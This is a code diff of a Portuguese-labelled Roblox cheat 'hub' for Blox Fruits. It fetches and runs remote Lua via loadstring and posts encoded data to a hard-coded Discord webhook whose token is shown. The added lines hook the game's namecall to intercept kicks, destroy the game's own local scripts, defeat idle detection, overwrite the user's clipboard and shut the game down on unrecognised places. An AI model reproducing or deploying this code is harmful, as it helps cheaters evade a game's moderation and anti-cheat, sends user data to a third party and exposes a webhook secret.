@@ -1,5 +1,3 @@
--- Sistema de key totalmente removido sem alterar executores
-
 local exploit = getexecutorname or identifyexecutor
 local support = {
     ["Fluxus"] = true,
@@ -67,21 +65,19 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     local Final = {Url = "https://discord.com/api/webhooks/1203612065302970389/GHxtX7Y_Pdy2lQbZPo91hEfvXRagarlM5OYjAFy7NiaVFKLbbZuRpDl-SX3w3y6Cv24W", Body = Encoded, Method = "POST", Headers = Headers}
                     Request(Final)
 
-
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
 
 local Window = Fluent:CreateWindow({
-    Title = "Nome Do Seu Hub | Blox Fruits",
+    Title = " Nome Do Seu Hub | Blox Fruits",
     SubTitle = "Version 2",
     TabWidth = 160,
     Size = UDim2.fromOffset(530, 350),
     Acrylic = true,
-    Theme = "Darker",
+    Theme = "Darker"
 })
-
 local Tabs = {
     Main = Window:AddTab({ Title = "Main", Icon = "rbxassetid://88147973848189" }),
     Setting = Window:AddTab({ Title = "Setting", Icon = "rbxassetid://88147973848189" }),
@@ -94,55 +90,97 @@ local Tabs = {
     Shop = Window:AddTab({ Title = "Shop", Icon = "rbxassetid://88147973848189" }),
     Misc = Window:AddTab({ Title = "Misc", Icon = "rbxassetid://88147973848189" }),
 }
-
-OrionLib:MakeNotification({
-    Name = "Notification",
-    Content = "Please Wait For Loading Code",
-    Image = "rbxassetid://88147973848189",
-    Time = 7
-})
-
+local Options = Fluent.Options
+do
+OrionLib:MakeNotification(
+        {
+            Name = "Notification",
+            Content = "Please Wait For Loading Code",
+            Image = "rbxassetid://88147973848189",
+            Time = 7
+        }
+    )
 _G.lakala = true
 
 setclipboard("Nome Do Seu Hub Is The Best")
 
+--Place Id Check
 local id = game.PlaceId
-if id == 2753915549 then First_Sea = true elseif id == 4442272183 then Second_Sea = true elseif id == 7449423635 then Third_Sea = true else game:Shutdown() end
+if id == 2753915549 then First_Sea = true; elseif id == 4442272183 then Second_Sea = true; elseif id == 7449423635 then Third_Sea = true; else game:Shutdown() end;
+------ajazksk
+local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower
 
-if getgenv().ED_AntiKick then return end
+--// Loaded check
+
+
+if getgenv().ED_AntiKick then
+	return
+end
+
+--// Variables
 
 local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")
 
+--// Global Variables
+
 getgenv().ED_AntiKick = {
-    Enabled = true,
-    SendNotifications = true,
-    CheckCaller = true
+	Enabled = true, -- Set to false if you want to disable the Anti-Kick.
+	SendNotifications = true, -- Set to true if you want to get notified for every event
+	CheckCaller = true -- Set to true if you want to disable kicking by other executed scripts
 }
 
+--// Main
+
 OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
-    if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and string.lower(getnamecallmethod()) == "kick" and ED_AntiKick.Enabled then
-        if getgenv().ED_AntiKick.SendNotifications then
-            StarterGui:SetCore("SendNotification", {
-                Title = "Nome Do Seu Hub",
-                Text = "The script has successfully intercepted an attempted kick.",
-                Icon = "rbxassetid://88147973848189",
-                Duration = 2,
-            })
-        end
-        return nil
-    end
-    return OldNamecall(...)
+	if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" and ED_AntiKick.Enabled then
+		if getgenv().ED_AntiKick.SendNotifications then
+			StarterGui:SetCore("SendNotification", {
+				Title = "Nome Do Seu Hub",
+				Text = "The script has successfully intercepted an attempted kick.",
+				Icon = "rbxassetid://88147973848189",
+				Duration = 2,
+			})
+		end
+
+		return nil
+	end
+
+	return OldNamecall(...)
 end))
 
 if getgenv().ED_AntiKick.SendNotifications then
-    StarterGui:SetCore("SendNotification", {
-        Title = "Nome Do Seu Hub",
-        Text = "Anti-Kick script loaded!",
-        Icon = "rbxassetid://88147973848189",
-        Duration = 3,
-    })
+	StarterGui:SetCore("SendNotification", {
+		Title = "Nome Do Seu Hub",
+		Text = "Anti-Kick script loaded!",
+		Icon = "rbxassetid://88147973848189",
+		Duration = 3,
+	})
 end
+--Flag Player
+if _G.lakala == true then
+    for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+        if v:IsA("LocalScript") then
+            if v.Name == "General" or v.Name == "Shiftlock"  or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
+                v:Destroy()
+            end
+        end
+     end
+     for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
+        if v:IsA("LocalScript") then
+            if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" then
+                v:Destroy()
+            end
+        end
+     end
+    end
+    
 
+--Anti AFK
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+	game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+	wait(1)
+	game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
 ------// BLOX FRUIT
 --// Sea world
 First_Sea = false
